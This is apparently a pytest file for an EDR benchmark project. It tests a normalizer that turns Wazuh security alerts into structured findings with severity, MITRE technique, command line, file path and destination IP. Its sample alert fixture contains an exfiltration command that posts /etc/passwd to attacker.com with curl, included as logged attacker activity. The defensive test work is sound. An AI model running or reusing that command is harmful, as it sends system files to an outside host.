"""Tests for WazuhNormalizer."""
from __future__ import annotations

import pytest

from edr_bench.edr_interface.wazuh_normalizer import WazuhNormalizer, _flatten_dict
from edr_bench.models.enums import Severity


SAMPLE_WAZUH_ALERT = {
    "timestamp": "2024-07-12T14:32:10.123+0000",
    "rule": {
        "level": 12,
        "description": "High amount of data exfiltrated via curl",
        "id": "100210",
        "mitre": {
            "id": ["T1048"],
            "tactic": ["Exfiltration"],
            "technique": ["Exfiltration Over Alternative Protocol"],
        },
    },
    "agent": {
        "id": "001",
        "name": "victim-linux",
        "ip": "172.28.1.10",
    },
    "data": {
        "command": "curl -X POST https://attacker.com/upload -d @/etc/passwd",
        "dstip": "203.0.113.50",
    },
    "syscheck": {
        "path": "/etc/passwd",
    },
    "full_log": "curl -X POST https://attacker.com/upload -d @/etc/passwd",
}

SAMPLE_WAZUH_SYSCHECK_ALERT = {
    "timestamp": "2024-07-12T15:00:00.000+0000",
    "rule": {
        "level": 7,
        "description": "Integrity checksum changed for /etc/shadow",
        "id": "550",
    },
    "syscheck": {
        "path": "/etc/shadow",
        "md5_before": "abc123",
        "md5_after": "def456",
    },
}


@pytest.mark.unit
class TestFlattenDict:
    def test_simple_nested(self):
        d = {"a": {"b": {"c": 1}}}
        assert _flatten_dict(d) == {"a.b.c": 1}

    def test_single_item_list_unwrap(self):
        d = {"rule": {"mitre": {"id": ["T1048"]}}}
        assert _flatten_dict(d) == {"rule.mitre.id": "T1048"}

    def test_multi_item_list_kept(self):
        d = {"tags": ["a", "b"]}
        assert _flatten_dict(d) == {"tags": ["a", "b"]}

    def test_flat_dict_unchanged(self):
        d = {"foo": "bar", "num": 42}
        assert _flatten_dict(d) == {"foo": "bar", "num": 42}


@pytest.mark.unit
class TestWazuhNormalizer:
    def setup_method(self):
        self.normalizer = WazuhNormalizer()

    def test_rule_name_extracted(self):
        finding = self.normalizer.normalize_json(SAMPLE_WAZUH_ALERT)
        assert finding.rule_name == "High amount of data exfiltrated via curl"

    def test_severity_mapped_from_level_12(self):
        finding = self.normalizer.normalize_json(SAMPLE_WAZUH_ALERT)
        assert finding.severity == Severity.HIGH

    def test_severity_mapped_from_level_7(self):
        finding = self.normalizer.normalize_json(SAMPLE_WAZUH_SYSCHECK_ALERT)
        assert finding.severity == Severity.MEDIUM

    def test_mitre_technique_extracted(self):
        finding = self.normalizer.normalize_json(SAMPLE_WAZUH_ALERT)
        assert finding.mitre_technique_id == "T1048"

    def test_command_line_extracted(self):
        finding = self.normalizer.normalize_json(SAMPLE_WAZUH_ALERT)
        assert "curl" in finding.command_line

    def test_file_path_extracted(self):
        finding = self.normalizer.normalize_json(SAMPLE_WAZUH_ALERT)
        assert finding.file_path == "/etc/passwd"

    def test_network_dst_extracted(self):
        finding = self.normalizer.normalize_json(SAMPLE_WAZUH_ALERT)
        assert finding.network_dst == "203.0.113.50"

    def test_timestamp_parsed(self):
        finding = self.normalizer.normalize_json(SAMPLE_WAZUH_ALERT)
        assert finding.timestamp.year == 2024
        assert finding.timestamp.month == 7

    def test_raw_preserved(self):
        finding = self.normalizer.normalize_json(SAMPLE_WAZUH_ALERT)
        assert "rule.level" in finding.raw

    def test_low_level_severity(self):
        alert = {
            "rule": {"level": 2, "description": "Low level alert"},
        }
        finding = self.normalizer.normalize_json(alert)
        assert finding.severity == Severity.INFO

    def test_critical_level_severity(self):
        alert = {
            "rule": {"level": 15, "description": "Critical alert"},
        }
        finding = self.normalizer.normalize_json(alert)
        assert finding.severity == Severity.CRITICAL

    def test_multi_mitre_id_takes_first(self):
        alert = {
            "rule": {
                "level": 7,
                "description": "File deleted.",
                "mitre": {
                    "id": ["T1070.004", "T1485"],
                    "tactic": ["Defense Evasion", "Impact"],
                },
            },
        }
        finding = self.normalizer.normalize_json(alert)
        assert finding.mitre_technique_id == "T1070.004"
